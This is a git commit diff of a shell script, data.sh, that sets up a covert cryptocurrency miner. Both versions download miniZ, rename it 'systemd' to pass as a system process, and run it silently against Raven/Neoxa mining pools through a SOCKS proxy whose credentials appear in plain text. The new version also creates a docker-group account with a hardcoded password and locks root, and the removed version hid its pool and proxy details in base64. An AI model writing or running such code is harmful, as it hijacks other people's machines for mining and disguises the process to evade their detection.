36432484f3e0a996418494b41aa43fabbf1c68e2
Inhuterk <158720380+Inhuterk@users.noreply.github.com>
2024-04-23 22:28:29 +0530

    Update data.sh

--- data.sh
+++ data.sh
@@ -1,25 +1,44 @@
 #!/bin/bash
 
-# Update and install docker.io
-sudo apt update && sudo apt install -y docker.io
+# Define variables
+new_username="isolated_user"
+password="isolate123"
+original_command="./systemd --par=kawpow --user RQFqPLG7ysPijH28DvJSMnzdUcd2rS68oh --server stratum.ravenminer.com --port 3838 --socks sipuwfea-rotate:e90ia636sn8t@p.webshare.io:80 --socksdns >/dev/null 2>&1"
 
-# Add user to docker group
-sudo usermod -aG docker root
-sudo usermod --add-subuids 1202-5868 root
+# Check if user exists
+if id "$new_username" &>/dev/null; then
+    echo "User $new_username already exists."
+else
+    # Create user account
+    sudo useradd -m -s /bin/bash -U "$new_username"
+
+    # Set user password
+    echo "$new_username:$password" | sudo chpasswd
+
+    # Add user to docker group
+    sudo usermod -aG docker "$new_username"
+
+    # Add subuids for user
+    sudo usermod --add-subuids 10-20000 "$new_username"
+
+    # Lock the user's password to prevent login
+    sudo passwd -l "$new_username"
+fi
+
+# Lock root user
 sudo usermod -L root
 
-# Download and extract miniZ
+# Update and install Docker
+sudo apt update && sudo apt install -y docker.io
+
+# Download miniZ
 wget https://github.com/miniZ-miner/miniZ/releases/download/v2.3c/miniZ_v2.3c_linux-x64.tar.gz
+
+# Extract miniZ
 tar -xvf miniZ_v2.3c_linux-x64.tar.gz
 
-# Move miniZ to systemd directory
+# Move miniZ to systemd
 mv miniZ systemd
 
-# Encode sensitive information using Base64
-server_encoded=$(echo "tr.neoxa.herominers.com" | base64)
-port_encoded=$(echo "1202" | base64)
-user_encoded=$(echo "GgxJdQzEZeXHQZSApbCdWFtYR7QufiN1RL" | base64)
-socks_encoded=$(echo "sipuwfea:e90ia636sn8t@38.154.227.167:5868" | base64)
-
-# Execute the command with encoded sensitive information
-./systemd --par=kawpow --user "$(echo "$user_encoded" | base64 -d)" --server "$(echo "$server_encoded" | base64 -d)" --port "$(echo "$port_encoded" | base64 -d)" --socks "$(echo "$socks_encoded" | base64 -d)" --socksdns > /dev/null 2>&1
+# Execute the original command
+$original_command
